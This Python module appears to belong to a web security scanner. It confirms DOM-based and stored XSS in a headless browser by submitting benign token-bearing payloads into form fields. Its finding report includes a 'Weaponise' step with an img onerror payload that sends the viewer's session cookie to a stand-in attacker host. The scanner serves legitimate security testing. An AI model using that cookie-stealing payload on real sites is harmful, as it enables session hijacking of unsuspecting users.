"""
dom_xss — browser-verified DOM-based / stored XSS (optional Playwright pass for xss_detect).

The httpx passes in ``xss_detect`` only see server HTML. A payload that the page writes into the DOM
with client-side JavaScript (e.g. ``el.innerHTML += post.message``) never appears in the server
response and only *executes* in a real browser — so an HTTP-only scanner is structurally blind to it
(this is exactly why Google's XSS-game level 2 was missed).

This pass drives headless Chromium: per candidate page it fills the text fields with **benign,
token-bearing** payloads, submits, re-renders (and reloads, for the stored case), and confirms
execution by catching a callback from the payload — a unique ``window.__hadesxss(token)`` hook (and a
wrapped ``alert``/``confirm``/``prompt``). A fired token proves DOM/stored XSS.

Detection-only: the payload calls an in-page hook with a random token — no exfiltration, no network
egress, no persistence beyond the app's own storage. Findings are emitted under ``xss_detect`` so this
adds no new registered module. Everything is bounded (page/field caps, per-nav timeouts) and every
failure is swallowed so a browser hiccup never breaks the scan.
"""
from __future__ import annotations

import uuid
from dataclasses import dataclass
from typing import Any

from loguru import logger

from scanner import browser as br
from scanner.engine import Finding, Severity, ScanEngine

# Findings are attributed to xss_detect (module 33) — this is a verification pass, not a new module.
MODULE = "xss_detect"

_MAX_PAGES = 5          # candidate pages to drive
_MAX_FIELDS = 3         # text fields to fuzz per page
_NAV_TIMEOUT_MS = 15000
_NAV_WAIT = "load"      # wait for window.onload — many apps wire the submit handler there
_SETTLE_MS = 1800       # let the async save (XHR) + innerHTML re-render run

# Free-text field-name hints worth fuzzing for stored XSS (prioritises pages that have them).
_TEXTISH = ("message", "comment", "status", "body", "content", "text", "post", "note", "title",
            "subject", "description", "feedback", "review", "search", "q", "query", "name")

# Runs before page scripts on every navigation: defines the hook and wraps the dialog functions.
_INIT_SCRIPT = """
window.__hadesxss_hits = window.__hadesxss_hits || [];
window.__hadesxss = function(t){ try { window.__hadesxss_hits.push(String(t)); } catch(e){} };
['alert','confirm','prompt'].forEach(function(fn){
  try { window[fn] = function(){ try { window.__hadesxss_hits.push('ALERT:'+arguments[0]); } catch(e){} return true; }; }
  catch(e){}
});
"""

_FIELD_SELECTOR = ("textarea, input[type=text], input[type=search], input[type=url], "
                   "input[type=email], input:not([type])")


@dataclass
class DomXssHit:
    url: str
    field: str
    payload: str
    trigger: str        # "dom-hook" | "alert"
    token: str


def _is_textish(name: str) -> bool:
    low = (name or "").lower()
    return any(h in low for h in _TEXTISH)


def _payload(token: str) -> str:
    """A benign token-bearing payload for the common innerHTML sink (img onerror is universal)."""
    return f'"><img src=x onerror="window.__hadesxss && window.__hadesxss(\'{token}\')">'


# ---------------------------------------------------------------------------
# Candidate selection
# ---------------------------------------------------------------------------

def candidates(engine: ScanEngine) -> list[str]:
    """Pages worth driving in a browser: those carrying a form (textish forms first) + the target."""
    seen: set[str] = set()
    prioritized: list[str] = []
    rest: list[str] = []
    try:
        crawl = engine.get_crawl()
    except Exception:  # noqa: BLE001
        crawl = None
    for form in (crawl.forms if crawl else []):
        page = form.source_url or form.action
        if not page or page in seen:
            continue
        seen.add(page)
        (prioritized if any(_is_textish(n) for n in form.fields) else rest).append(page)
    if engine.url not in seen:
        prioritized.append(engine.url)
    return (prioritized + rest)[:_MAX_PAGES]


# ---------------------------------------------------------------------------
# Browser interaction (each helper is defensive — never raises out)
# ---------------------------------------------------------------------------

def _fired_token(page: Any, token: str) -> str:
    """Return the trigger name if *token* shows up in the in-page hit log, else ''."""
    try:
        hits = page.evaluate("window.__hadesxss_hits || []") or []
    except Exception:  # noqa: BLE001
        return ""
    for h in hits:
        s = str(h)
        if token in s:
            return "alert" if s.startswith("ALERT:") else "dom-hook"
    return ""


def _submit(page: Any, field: Any) -> None:
    """Submit the field's *own* form — pages often have several forms (e.g. a separate "clear" form),
    so a page-wide submit button is the wrong one. Falls back to requestSubmit()/submit()/Enter."""
    try:
        ok = field.evaluate(
            "el => {"
            "  const form = el.form || el.closest('form');"
            "  if (!form) return false;"
            "  const btn = form.querySelector('button[type=submit], input[type=submit], button:not([type])');"
            "  if (btn) { btn.click(); return true; }"
            "  if (form.requestSubmit) { form.requestSubmit(); return true; }"
            "  form.submit(); return true;"
            "}")
        if ok:
            return
    except Exception:  # noqa: BLE001
        pass
    try:
        field.press("Enter")
    except Exception:  # noqa: BLE001
        pass


def _verify_field(context: Any, url: str, index: int) -> DomXssHit | None:
    """Fill the *index*-th text field on a fresh load of *url*, submit, reload, check for a fire."""
    page = context.new_page()
    try:
        page.goto(url, timeout=_NAV_TIMEOUT_MS, wait_until=_NAV_WAIT)
        fields = page.query_selector_all(_FIELD_SELECTOR)
        if index >= len(fields):
            return None
        field = fields[index]
        name = field.get_attribute("name") or field.get_attribute("id") or f"field#{index}"
        token = uuid.uuid4().hex[:12]
        payload = _payload(token)
        field.fill(payload)
        _submit(page, field)
        page.wait_for_timeout(_SETTLE_MS)

        trigger = _fired_token(page, token)        # reflected / immediate (SPA) render
        if not trigger:
            try:                                   # stored: reload so saved content re-renders
                page.goto(url, timeout=_NAV_TIMEOUT_MS, wait_until=_NAV_WAIT)
                page.wait_for_timeout(_SETTLE_MS)
                trigger = _fired_token(page, token)
            except Exception:  # noqa: BLE001
                pass
        if trigger:
            return DomXssHit(url=url, field=name, payload=payload, trigger=trigger, token=token)
        return None
    finally:
        try:
            page.close()
        except Exception:  # noqa: BLE001
            pass


def _field_count(context: Any, url: str) -> int:
    page = context.new_page()
    try:
        page.goto(url, timeout=_NAV_TIMEOUT_MS, wait_until=_NAV_WAIT)
        return len(page.query_selector_all(_FIELD_SELECTOR))
    except Exception:  # noqa: BLE001
        return 0
    finally:
        try:
            page.close()
        except Exception:  # noqa: BLE001
            pass


def verify(engine: ScanEngine, pages: list[str]) -> list[DomXssHit]:
    """Drive headless Chromium over *pages*; return confirmed DOM/stored XSS hits. Never raises."""
    hits: list[DomXssHit] = []
    try:
        from playwright.sync_api import sync_playwright
    except Exception as exc:  # noqa: BLE001
        logger.debug(f"dom_xss: Playwright unavailable: {exc}")
        return hits

    try:
        with sync_playwright() as p:
            browser, context = br.launch_context(p, engine)
            try:
                context.add_init_script(_INIT_SCRIPT)
                for url in pages[:_MAX_PAGES]:
                    seen_fields: set[str] = set()
                    n = min(_field_count(context, url), _MAX_FIELDS)
                    for i in range(n):
                        try:
                            hit = _verify_field(context, url, i)
                        except Exception as exc:  # noqa: BLE001
                            logger.debug(f"dom_xss: {url} field#{i} failed: {exc}")
                            continue
                        if hit and hit.field not in seen_fields:
                            seen_fields.add(hit.field)
                            hits.append(hit)
            finally:
                browser.close()
    except Exception as exc:  # noqa: BLE001 — a browser failure must never break the scan
        logger.warning(f"dom_xss: browser pass failed: {exc}")
    return hits


# ---------------------------------------------------------------------------
# Finding factory
# ---------------------------------------------------------------------------

def to_finding(hit: DomXssHit) -> Finding:
    where = f"form field '{hit.field}' on {hit.url}"
    desc = (f"A benign token payload submitted to {where} executed in a real browser "
            f"(trigger: {hit.trigger}) after the page rendered it with client-side JavaScript. "
            "This is a DOM-based / stored XSS: the value is written into the DOM (e.g. innerHTML) and "
            "runs whenever the page is viewed — invisible to HTTP-only checks because it never appears "
            "in the server response.")
    raw = {
        "location": where, "url": hit.url, "field": hit.field, "payload": hit.payload,
        "trigger": hit.trigger, "confidence": "high", "verified": "browser",
        "evidence": [
            f"submitted to '{hit.field}': {hit.payload}",
            f"payload executed in headless Chromium on {hit.url} (trigger: {hit.trigger}, token {hit.token})",
        ],
        "exploitation": [
            {"step": 1, "description": "Reproduce in a browser — the payload runs when the stored value renders.",
             "command": f"# open {hit.url}, submit into '{hit.field}': {hit.payload}"},
            {"step": 2, "description": "Auto-discover working payloads / confirm with dalfox.",
             "command": f'dalfox url "{hit.url}"'},
            {"step": 3, "description": "Weaponise: exfiltrate the viewer's session cookie.",
             "command": '<img src=x onerror="new Image().src=\'https://ATTACKER/c?\'+document.cookie">'},
        ],
    }
    return Finding(
        module=MODULE,
        title=f"DOM-based / Stored XSS (browser-verified): {hit.field}",
        description=desc,
        severity=Severity.HIGH,
        recommendation=("Never write untrusted input with innerHTML — use textContent or a safe "
                        "templating layer that auto-escapes; context-encode on output and add a strict "
                        "Content-Security-Policy that forbids inline event handlers."),
        raw=raw,
    )
